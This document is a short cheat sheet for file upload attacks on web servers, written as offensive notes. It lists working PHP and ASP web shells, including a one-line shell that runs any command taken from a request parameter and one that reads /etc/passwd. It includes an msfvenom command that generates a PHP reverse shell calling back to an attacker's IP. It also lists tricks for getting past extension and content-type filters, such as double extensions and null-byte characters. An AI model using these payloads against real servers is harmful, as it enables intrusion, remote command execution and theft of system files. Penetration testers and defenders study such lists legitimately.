```bash
# Cheat Sheet

## Web Shells

| Web Shell | Description |
|----------|-------------|
| `<?php echo file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| PHP Web Shell (phpbash) | https://github.com/Arrexel/phpbash |
| Pentestmonkey PHP Reverse Shell | https://github.com/pentestmonkey/php-reverse-shell |
| SecLists Web Shells | https://github.com/danielmiessler/SecLists/tree/master/Web-Shells |

## Bypasses

### Client-Side Bypass
- `CTRL + SHIFT + C` → Toggle Web Inspector

### Blacklist Bypass
- `shell.phtml` → Uncommon extension  
- `shell.pHp` → Case manipulation  
- PHP Extensions: https://github.com/swisskyrepo/PayloadsAllTheThings/.../extensions.lst  
- ASP Extensions: https://github.com/swisskyrepo/.../Extension%20ASP  
- Web Extensions: https://github.com/danielmiessler/.../web-extensions.txt  

### Whitelist Bypass
- `shell.jpg.php` → Double extension  
- `shell.php.jpg` → Reverse double extension  
- Injection chars: `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`

### Content-Type Bypass
- All content-types list  
  https://github.com/danielmiessler/.../web-all-content-types.txt  
- File signatures / magic bytes  
  https://en.wikipedia.org/wiki/List_of_file_signatures

## Limited Upload Attacks

| Attack | File Types |
|--------|------------|
| XSS | HTML, JS, SVG, GIF |
| XXE / SSRF | XML, SVG, PDF, PPT, DOC |
| DoS | ZIP, JPG, PNG |

```